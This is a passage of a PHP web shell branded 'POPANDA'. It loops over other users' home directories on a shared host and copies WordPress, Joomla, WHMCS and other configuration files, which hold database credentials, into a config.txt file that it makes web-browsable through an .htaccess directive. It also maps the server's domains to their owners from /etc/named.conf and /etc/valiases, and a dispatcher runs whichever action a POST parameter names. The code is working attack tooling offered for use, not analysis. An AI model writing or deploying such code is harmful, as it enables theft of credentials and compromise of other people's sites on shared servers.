            } elseif (file_exists('/home/' . $lol . '/public_html/site/wp-config.php')) {
                $content18 = file_get_contents('/home/' . $lol . '/public_html/site/wp-config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content18 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/configuration.php')) {
                $content19 = file_get_contents('/home/' . $lol . '/public_html/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content19 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/blog/configuration.php')) {
                $content20 = file_get_contents('/home/' . $lol . '/public_html/blog/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content20 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/joomla/configuration.php')) {
                $content21 = file_get_contents('/home/' . $lol . '/public_html/joomla/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content21 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/main/configuration.php')) {
                $content22 = file_get_contents('/home/' . $lol . '/public_html/main/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content22 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/home/configuration.php')) {
                $content23 = file_get_contents('/home/' . $lol . '/public_html/home/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content23 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/site/configuration.php')) {
                $content24 = file_get_contents('/home/' . $lol . '/public_html/site/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content24 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/whm/configuration.php')) {
                $content25 = file_get_contents('/home/' . $lol . '/public_html/whm/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content25 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/whmc/configuration.php')) {
                $content26 = file_get_contents('/home/' . $lol . '/public_html/whmc/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content26 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/support/configuration.php')) {
                $content27 = file_get_contents('/home/' . $lol . '/public_html/support/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content27 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/client/configuration.php')) {
                $content28 = file_get_contents('/home/' . $lol . '/public_html/client/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content28 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/billings/configuration.php')) {
                $content29 = file_get_contents('/home/' . $lol . '/public_html/billings/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content29 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/billing/configuration.php')) {
                $content30 = file_get_contents('/home/' . $lol . '/public_html/billing/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content30 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/clients/configuration.php')) {
                $content31 = file_get_contents('/home/' . $lol . '/public_html/clients/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content31 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/whmcs/configuration.php')) {
                $content32 = file_get_contents('/home/' . $lol . '/public_html/whmcs/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content32 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/order/configuration.php')) {
                $content33 = file_get_contents('/home/' . $lol . '/public_html/order/configuration.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content33 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/admin/conf.php')) {
                $content34 = file_get_contents('/home/' . $lol . '/public_html/admin/conf.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content34 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/admin/config.php')) {
                $content35 = file_get_contents('/home/' . $lol . '/public_html/admin/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content35 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/conf_global.php')) {
                $content36 = file_get_contents('/home/' . $lol . '/public_html/conf_global.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content36 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/include/db.php')) {
                $content37 = file_get_contents('/home/' . $lol . '/public_html/include/db.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content37 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/connect.php')) {
                $content38 = file_get_contents('/home/' . $lol . '/public_html/connect.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content38 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/mk_conf.php')) {
                $content39 = file_get_contents('/home/' . $lol . '/public_html/mk_conf.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content39 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/include/config.php')) {
                $content40 = file_get_contents('/home/' . $lol . '/public_html/include/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content40 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/settings.php')) {
                $content41 = file_get_contents('/home/' . $lol . '/public_html/settings.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content41 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/includes/functions.php')) {
                $content42 = file_get_contents('/home/' . $lol . '/public_html/includes/functions.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content42 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/include/db.php')) {
                $content43 = file_get_contents('/home/' . $lol . '/public_html/include/db.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content43 . $space);
                fclose($handle);
            }
        }
        $url = 'http://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['SCRIPT_NAME']) . '/POPANDA/';
        if (file_exists("POPANDA/config.txt")) {
            echo '<h3 class="POPANDA"><center><a href="' . $url . '" target="_blank"> Config Found ^_^</a></h3>';
            $myfile = fopen("POPANDA/.htaccess", "w") or die("Unable to open file!");
$txt = "Options +Indexes";
fwrite($myfile, $txt);
fclose($myfile);
        } else {
            echo '<h3 class="POPANDA"><center><a href="' . $url . '" target="_blank"> 0 Config Grab BC </a></h3>';
        }
    
    printFooter();
}

function actionShared() {
    printHeader();
    $file = @implode(@file("/etc/named.conf"));
if (!$file) {
die("# can't ReaD -> [ /etc/named.conf ]");
}
preg_match_all("#named/(.*?).db#", $file, $r);
$domains = array_unique($r[1]);
{
foreach ($domains as $domain) {
$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
$array= "http://$domain " . $user['name'] . "<br>";
$lol= '' . get_current_user();
if (strpos($array, "$lol") !== false) {
$shared = str_replace(array(" $lol"), "", $array);
echo "<center>$shared"; 
}
}
}
    printFooter();
}

if( empty($_POST['a']) )
    if(isset($default_action) && function_exists('action' . $default_action))
        $_POST['a'] = $default_action;
    else
        $_POST['a'] = 'SecInfo';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
    call_user_func('action' . $_POST['a'])
?>
